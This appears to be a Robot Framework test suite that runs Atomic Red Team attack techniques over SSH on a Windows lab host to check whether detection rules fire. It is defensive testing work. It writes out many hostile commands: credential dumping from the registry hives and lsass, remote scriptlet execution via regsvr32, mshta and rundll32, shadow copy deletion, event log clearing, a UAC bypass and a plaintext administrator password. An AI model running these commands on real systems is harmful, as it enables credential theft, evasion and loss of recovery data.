#   [Tags]  Red Canary Atomic T1127 Defense Evasion Execution
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1127\\T1127.csproj
#   ${target_n}  Set Variable   MSBuild.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name Account Discovery_26
#   [Documentation]  The responses of Account Discovery
#   [Tags]  Red Canary Atomic T1087 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   net user   net user /domain   dir c:\\Users\\   cmdkey.exe /list   net localgroup "Users"   net localgroup
#   ${target_n}  Set Variable   net1.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name Account Discovery_27
#   [Documentation]  The responses of Account Discovery
#   [Tags]  Red Canary Atomic T1087 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe net user   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe net user /domain   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-localuser   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-localgroupmembers -group Users   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdkey.exe /list   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ls C:/Users   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-childitem C:\\Users\\   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe dir C:\Users\   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-aduser -filter *   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-localgroup   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe net localgroup
#   ${target_n}  Set Variable   net.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Account Discovery_28
#   [Documentation]  The responses of Account Discovery
#   [Tags]  Red Canary Atomic T1087 Discovery
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   query user
#   ${target_n}  Set Variable   net1.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Account Discovery_29
#   [Documentation]  The responses of Account Discovery
#   [Tags]  Red Canary Atomic T1087 Discovery
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe query user
#   ${target_n}  Set Variable   net.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Network Share Discovery_30
#   [Documentation]  The responses of Network Share Discovery
#   [Tags]  Red Canary Atomic T1135 Discovery
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   net view \\EC2AMAZ-2RJ1BIF
#   ${target_n}  Set Variable   EC2AMAZ-2RJ1BIF
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Network Share Discovery_31
#   [Documentation]  The responses of Network Share Discovery
#   [Tags]  Red Canary Atomic T1135 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe net view \\EC2AMAZ-2RJ1BIF   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-smbshare -Name EC2AMAZ-2RJ1BIF
#   ${target_n}  Set Variable   EC2AMAZ-2RJ1BIF
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Password Policy Discovery_32
#   [Documentation]  The responses of Password Policy Discovery
#   [Tags]  Red Canary Atomic T1201 Discovery
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   net accounts
#   ${target_n}  Set Variable   net1.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Password Policy Discovery_33
#   [Documentation]  The responses of Password Policy Discovery
#   [Tags]  Red Canary Atomic T1201 Discovery
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   net accounts /domain
#   ${target_n}  Set Variable   net1.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name Network Share Discovery_34
#   [Documentation]  The responses of Network Share Discovery
#   [Tags]  Red Canary Atomic T1069 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   net localgroup   net group /domain
#   ${target_n}  Set Variable   net.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Network Share Discovery_35
#   [Documentation]  The responses of Network Share Discovery
#   [Tags]  Red Canary Atomic T1069 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-localgroup   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe get-ADPrinicipalGroupMembership administrator | select name
#   ${target_n}  Set Variable   net.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Query Registry_36
#   [Documentation]  The responses of Query Registry
#   [Tags]  Red Canary Atomic T1012 Discovery
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce   reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices   reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices   reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify   reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit   reg query HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell   reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce   reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run   reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run   reg query hklm\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"   reg Query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   reg save HKLM\\Security security.hive   reg save HKLM\\System system.hive   reg save HKLM\\SAM sam.hive
#   ${target_n}  Set Variable   .hive
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Remote System Discovery net_37
#   [Documentation]  The responses of Remote System Discovery net
#   [Tags]  Red Canary Atomic T1018 Defense Evasion Execution
#   @{cmd_names}   Create List   net view /domain   net view
#   ${target_n}   Set Variable   view
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Regsvr32 remote COM scriptlet execution_38
#   [Documentation]  The responses of Regsvr32 remote COM scriptlet execution
#   [Tags]  Red Canary Atomic T1117 Defense Evasion Execution
#   ${cmd_name}   Set Variable   regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
#   ${target_n}   Set Variable   regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Credential Dumping_39
#   [Documentation]  The responses of Credential Dumping
#   [Tags]  Red Canary Atomic T1003 Defense Evasion Execution
#   @{cmd_names}   Create List   reg save HKLM\\sam sam   reg save HKLM\\system system   reg save HKLM\\security security
#   ${target_n}   Set Variable   system
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Dump LSASS.exe Memory using ProcDump_40
#   [Documentation]  The responses of Credential Dumping
#   [Tags]  Red Canary Atomic T1003 Defense Evasion Execution
#   ${cmd_name}   Set Variable   C:\\Users\\Administrator\\Downloads\\Procdump\\procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
#   ${target_n}   Set Variable   lsass_dump.dmp
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Windows Remote Management_41
#   [Documentation]  The responses of Windows Remote Management
#   [Tags]  Red Canary Atomic T1028 Execution, Lateral Movement
#   ${cmd_name}   Set Variable   wmic /user:Administrator /password:NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /node:EC2AMAZ-TCA8E2S process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
#   ${target_n}   Set Variable   NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Windows Admin Shares_42
#   [Documentation]  The responses of Windows Admin Shares
#   [Tags]  Red Canary Atomic T1077 Lateral Movement
#   ${cmd_name}   Set Variable   cmd.exe /c "net use \\EC2AMAZ-TCA8E2S\C$ NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p /u:Administrator"
#   ${target_n}   Set Variable   NK@wtynrsmfDU4pC$X$?rT?Ne2k-m%=p
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Remote File Copy_43
#   [Documentation]  The responses of Remote File Copy
#   [Tags]  Red Canary Atomic T1105 Command And Control, Lateral Movement
#   ${cmd_name}   Set Variable   cmd.exe /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt
#   ${target_n}   Set Variable   -urlcache
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Remote File Copy_44
#   [Documentation]  The responses of Remote File Copy
#   [Tags]  Red Canary Atomic T1105 Command And Control, Lateral Movement
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe New-Item -Path $datePath -ItemType Directory   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Setr-Location $datePath   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach -Object { Move-Item $_.Name -Destination C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt }
#   ${target_n}  Set Variable   certutil.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Remote File Copy_45
#   [Documentation]  The responses of Remote File Copy
#   [Tags]  Red Canary Atomic T1105 Command And Control, Lateral Movement
#   ${cmd_name}   Set Variable   C:\\windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\LICENSE.txt
#   ${target_n}   Set Variable   qcxjb7
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
Get Responses of target_name BITS Jobs_46
   [Documentation]  The responses of BITS Jobs Rule Name:Bitsadmin Download-pass-2/2
   [Tags]  Red Canary Atomic T1197 Defense Evasion, Persistence
   @{cmd_names}   Create List  bitsadmin.exe /transfer /Download /priority high https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Windows\\Temp\\bitsadmin_flag.ps1   bitsadmin.exe /create AtomicBITS /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Windows\\Temp\\bitsadmin_flag.ps1  bitsadmin.exe /setnotifycmdline AtomicBITS /addfile AtomicBITS C:\\Windows\\system32\\notepad.exe C:\\Windows\\Temp\\bitsadmin_flag.ps1  bitsadmin.exe /complete AtomicBITS  bitsadmin.exe /resume AtomicBITS
   ${target_n}   Set Variable  bitsadmin.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Web Shell Written to Disk_47
   [Documentation]  The responses of Web Shell Written to Disk Rule Name:Web Shell Written to Disk-pass-1/1
   [Tags]  Red Canary Atomic T1100 Persistence, Privilege Escalation
   ${cmd_name}   Set Variable  xcopy.exe C:\\AtomicRedTeam\\atomics\\T1100\\shells C:\\inetput\\wwwroot
   ${target_n}   Set Variable  xcopy.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}

Get Responses of target_name CMSTP_48
   [Documentation]  The responses of CMSTP Rule Name:CMSTP Executing-pass-2/2
  [Tags]  Red Canary Atomic T1191 Defense Evasion, Execution
   @{cmd_names}  Create list  cmstp.exe /s T1191.inf  cmstp.exe /s T1191_uacbypass.inf /au
   ${target_n}   Set Variable  cmstp.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Compiled HTML Help Local Payload & Remote payload_49
   [Documentation]  The responses of Compiled HTML Help Local Payload Rule Name:Compiled HTML Help-pass-2/2
   [Tags]  Red Canary Atomic T1223 Defense Evasion, Execution
   @{cmd_names}  Create list  hh.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1223\\src\\T1223.chm   hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
   ${target_n}   Set Variable  hh.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Deobfuscate/Decode Files or Information_50
   [Documentation]  The responses of Deobfuscate/Decode Files or Information Rule Name:Suspicious Certutil Command--pass-2/2
   [Tags]  Red Canary Atomic T1140 Defense Evasion
   @{cmd_names}  Create List  certutil.exe -encode c:\file.exe file.txt  certutil.exe -decode file.txt c:\file.exe cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp  cmd.exe /c %temp%tcm.tmp -decode c:\file.exe file.txt
   ${target_n}  Set Variable  certutil
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Unload Sysmon Filter Driver_51
   [Documentation]  The responses of Unload Sysmon Filter Driver Rule Name:Service Stop----pass-1/1
   [Tags]  Red Canary Atomic T1089 Defense Evasion
   @{cmd_names}  Create List  sc stop sysmon  fltmc.exe load SysmonDrv  sc start sysmon
   ${target_n}  Set Variable  sc.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name File Deletion_52
   [Documentation]  The responses of File Deletion Rule Name:File Deletion-pass-4/4
   [Tags]  Red Canary Atomic T1107 Defense Evasion
   @{cmd_names}  create list  del /f C:\\Users\\Administrator\\Downloads\\_cleanup.bat  del /f /S C:\\Users\\Administrator\\Downloads\\sheshu  powershell.exe Remove-Item -path  "C:\\Users\\Administrator\\_cleanup.bat"  powershell.exe Remove-Item -path "C:\\Users\\Administrator\\Downloads\\mynew" -recurse
   ${target_n}  Set Variable  del
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Delete VSS - wmic,wbadmin & vssadmin_53-pass-1/3
   [Documentation]  The responses of Delete VSS - wmic,wbadmin & vssadmi Rule Name:Suspicious Process Creation for wmic-->pass,Activity Related to NTDS.dit Domain Hash Retrieval for vssadmin--fail & Catalog Deletion with wbadmin.exe-fail
   [Tags]  Red Canary Atomic T1107 Defense Evasion
   @{cmd_names}  Create List  vssadmin.exe Delete Shadows /All /Quiet  wmic shadowcopy delete  wbadmin delete catalog -quiet
   ${target_n}  Set Variable  Delete
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name File Deletion bcdedit_54
   [Documentation]  The responses of File Deletion bcdedit Rule Name:Bcdedit Checking pass-1/1
   [Tags]  Red Canary Atomic T1107 Defense Evasion
   @{cmd_names}  Create List  bcdedit /set {default} bootstatuspolicy ignoreallfailures  bcdedit /set {default} recoveryenabled no
   ${target_n}  Set Variable  bcdedit
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name File Permissions Modification_55
   [Documentation]  The responses of File Permissions Modification using takeown.exe Rule Name:File Permissions Modification pass-2/2
   [Tags]  Red Canary Atomic T1222 Defense Evasion
   @{cmd_names}  Create List  takeown.exe /f c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\T1222.yaml  takeown.exe /f c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\ /r
   ${target_n}  Set Variable  takeown.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name File Permissions Modification_56
   [Documentation]  The responses of File Permissions Modification using cacls.exe & icacls.exe Rule Name:File Permissions Modification pass-4/4
   [Tags]  Red Canary Atomic T1222 Defense Evasion
   @{cmd_names}  Create List  cacls.exe c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\T1222.yaml /grant Everyone:F   cacls.exe c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\ /grant Everyone:F /t  icacls.exe c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\T1222.yaml /grant Everyone:F   icacls.exe c:\users\administrator\Downloads\atomic_red_team\atomic_red_team\atomics\T1222\ /grant Everyone:F /t
   ${target_n}  Set Variable  grant
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name File Permissions Modification_57
   [Documentation]  The responses of File Permissions Modification using attrib.exe Rule Name:File Permissions Modification pass-1/1
   [Tags]  Red Canary Atomic T1222 Defense Evasion
   ${cmd_name}  Set Variable  attrib.exe -r C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1222
   ${target_n}  Set Variable  attrib.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Indicator Removal on Host_58
   [Documentation]  The responses of Indicator Removal on Host Clear Logs_1 Rule Name:Clearing Windows Event Logs pass -1/1
   [Tags]  Red Canary Atomic T1070 Defense Evasion
   ${cmd_name}  Set Variable  wevtutil cl system
   ${target_n}  Set Variable  wevtutil.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Indicator Removal on Host_59
   [Documentation]  The responses of Indicator Removal on Host FSUtil_2 Rule Name:USN Journal Deletion with fsutil.exe pass-1/1
   [Tags]  Red Canary Atomic T1070 Defense Evasion
   ${cmd_name}  Set Variable  fsutil usn deletejournal /D C:
   ${target_n}  Set Variable  fsutil.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Indirect Command Execution_60
   [Documentation]  The responses of Indirect Command Execution using pcalua.exe --fail-->Indirect Command Execution
   [Tags]  Red Canary Atomic T1202 Defense Evasion
   @{cmd_names}  Create List  pcalua.exe -a calc.exe  pcalua.exe -a c:\temp\payload.dll  pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
   ${target_n}  Set Variable  pcalua.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten  @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Indirect Command Execution_61
   [Documentation]  The responses of Indirect Command Execution using forfiles--pass-->Indirect Command Execution
   [Tags]  Red Canary Atomic T1202 Defense Evasion
   @{cmd_names}  Create List  forfiles /p c:\\windows\\system32 /m notepad.exe calc.exe  forfiles /p c:\\windows\\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
   ${target_n}  Set Variable  forfiles
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Masquerading_62
   [Documentation]  The responses of Masquerading Rule Name-->process_name_masquerade--pass
   [Tags]  Red Canary Atomic T1036 Defense Evasion
   @{cmd_names}  Create List  cmd.exe /c copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe  cmd.exe /c %SystemRoot%\\Temp\\lsass.exe
   ${target_n}  Set Variable  lsass.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Mshta_63
   [Documentation]  The responses of Mshta -->pass-->Rule Name:->MS HTA tool with Network Callback
   [Tags]  Red Canary Atomic T1170 Defense Evasion & Execution
   ${cmd_names}  Set Variable  mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();
   ${target_n}  Set Variable  mstha.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Network Share Connection Removal_64
   [Documentation]  The responses of Network Share Connection Removal Rule Names:System Network Configuration Discovery & Net.exe Execution_pass 2/2
   [Tags]  Red Canary Atomic T1126 Defense Evasion & Execution
   @{cmd_names}  Create List  net use c:\\test\\share  net share test=\\test\\share /REMARK:"test share" /CACHE:No  net share \\test\\share /delete
   ${target_n}  Set Variable  net.exe
   Loop for do_ssh  @{cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Regsvr32_65
   [Documentation]  The responses of Regsvr32 Rule Name :Regsvr32 Anomaly-pass-1/1
   [Tags]  Red Canary Atomic T1117 Defense Evasion & Execution
   ${cmd_name}  Set Variable  regsvr32.exe /s /u /i:C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1117\\RegSvr32.sct scrobj.dll
   ${target_n}  Set Variable  regsvr32.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Rootkit_66
   [Documentation]  The responses of Rootkit
   [Tags]  Red Canary Atomic T1014 Defense Evasion Rule Name:--Loadable Kernel Module based Rootkit--pass-1/1
   ${cmd_name}  Set Variable  C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1014\\bin\\puppetstrings.exe C:\\Drivers\\driver.sys
   ${target_n}  Set Variable  puppetstrings
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Rundll32_67
   [Documentation]  The responses of Rundll32 Rule Name:-Suspicious Rundll32 Activity pass-1/1
   [Tags]  Red Canary Atomic T1085 Defense Evasion & Execution
   ${cmd_name}  Set Variable  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"
   ${target_n}  Set Variable  rundll32.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Signed Binary Proxy Execution_68
   [Documentation]  The responses of Signed Binary Proxy Execution_1 Rule Name:--Hooking and MavInject Process Injection--pass-1/1
   [Tags]  Red Canary Atomic T1218 Defense Evasion & Execution
   ${cmd_name}  Set Variable  mavinject.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1218\\src\\x64\\T1218.dll /INJECTRUNNING 1000
   ${target_n}  Set Variable  mavinject.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Signed Binary Proxy Execution_69
   [Documentation]  The responses of Signed Binary Proxy Execution_2 Rule Name:-->Signed Binary Proxy Execution--pass-1/1
   [Tags]  Red Canary Atomic T1218 Defense Evasion & Execution
   ${cmd_name}  Set Variable  SyncAppvPublishingServer.exe "n;Start-Process calc.exe"
   ${target_n}  Set Variable  SyncAppvPublishingServer.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Signed Binary Proxy Execution_70
   [Documentation]  The responses of Signed Binary Proxy Execution_3 Rule Name:-->Signed Binary Proxy Execution--pass-1/1
   [Tags]  Red Canary Atomic T1218 Defense Evasion & Execution
   ${cmd_name}  Set Variable  C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1218\\src\\x64\\T1218.dll
   ${target_n}  Set Variable  Register-CimProvider.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Response of target_name Signed Binary Proxy Execution_71
    [Documentation]  The responses of Signed script Proxy Execution_4 Rule Name:-->Signed script Proxy Execution--pass-1/1
    [Tags]  Red Canary Atomic T1216 Defense Evasion & Execution
    ${cmd_name}  Set Variable  cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct"
    ${target_n}  Set Variable  cscript.exe
    do_ssh  ${windows_host_ip}  pass  ${cmd_name}
    ${Status}=  Loop over range_ten   @{range}  ${target_n}
